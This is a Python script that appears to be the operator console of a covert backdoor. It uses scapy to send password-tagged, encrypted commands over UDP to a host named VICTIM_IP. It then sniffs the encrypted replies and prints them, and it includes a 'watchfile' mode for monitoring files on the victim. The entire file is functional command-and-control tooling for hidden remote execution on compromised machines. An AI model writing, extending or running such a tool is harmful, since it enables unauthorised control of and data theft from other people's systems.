import argparse
from scapy.all import *
from scapy.layers.inet import IP, UDP
from crypto import *
from config import *

return_payload = ""

def stp_filter(packet):
    #print("DEBUG: Entering stp_filter")
    # print("####################RESPONSE_START###################\n")
    # print decrypt(packet['Raw'].load)
    # print("####################RESPONSE_END#####################\n")
    if packet.haslayer(Raw):
        if decrypt(packet['Raw'].load) == "finished":
            global return_payload
            print (return_payload)
            return_payload =""
            return True
    return False


def sniff_callback(packet):
        #print ("DEBUG: Entering sniff_callback")
        if packet.haslayer(Raw):
            payload = decrypt(packet['Raw'].load)
            if payload[0:len(PASSWORD)] != PASSWORD:
                return
            global return_payload
            return_payload += payload[len(PASSWORD):len(payload)]


def main():
    # Main loop
    while 1:
        command = raw_input("Command to send:")
        if command == 'watchfile':
            watch_patch = raw_input("Path to watch:")
            command = PASSWORD + "1" + watch_patch
        else:
            command = PASSWORD +"0" + command

        cipher_command = encrypt(command)

        packet = IP(dst=VICTIM_IP, src=ATTACKER_IP) / UDP(sport=int(ATTACKER_PORT), dport=int(VICTIM_PORT)) / cipher_command

        send(packet)
        sniff(filter="udp and src port " + str(VICTIM_PORT) + " and dst port " + str(ATTACKER_PORT), stop_filter=stp_filter, prn=sniff_callback)


if __name__ == '__main__':
    main()